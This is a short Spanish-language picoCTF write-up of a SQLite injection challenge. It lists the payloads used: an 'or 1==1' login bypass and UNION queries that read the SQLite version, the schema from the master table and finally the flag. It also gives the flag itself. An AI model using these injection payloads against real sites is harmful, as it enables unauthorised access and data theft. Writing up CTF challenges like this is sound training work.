
## Descripción

*Can you find the flag on this website.
Additional details will be available after launching your challenge instance.*

## Pistas

*SQLiLite*

## Solución

```
please login in
'or 1==1;
password
'or 1==1;
'union select sqlite_version(),2,3;
Algiers' union select sql,2,3 from sqlite_sqli_master;
hola' union select id,flag,3,from more_table;
```

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}

*Burpsite*

*Prendemos burpsite para interceptar la inyección, ponemos la info de login, nos vamos a proxy a la solicitud inicial y en la respuesta se encuentra la bandera
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}*
## Notas Adicionales 

*Intentamos logearnos con admin y admin de contraseña, no nos permite, entonces es una inyección sql, intentamos con ' or 1= =1; en ambos apartados y logramos entrar a página de bienvenida, para seguir buscando, ocupamos saber sobre sqli lite, encontramos el comando para buscar la versión le damos en buscar, si la encuentra, ahora buscamos la estructura de las tablas con sqli master, extraemos los datos de la tabla con un select y al buscar nos da la bandera *


## Referencias 

http://saturn.picoctf.net:53830/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

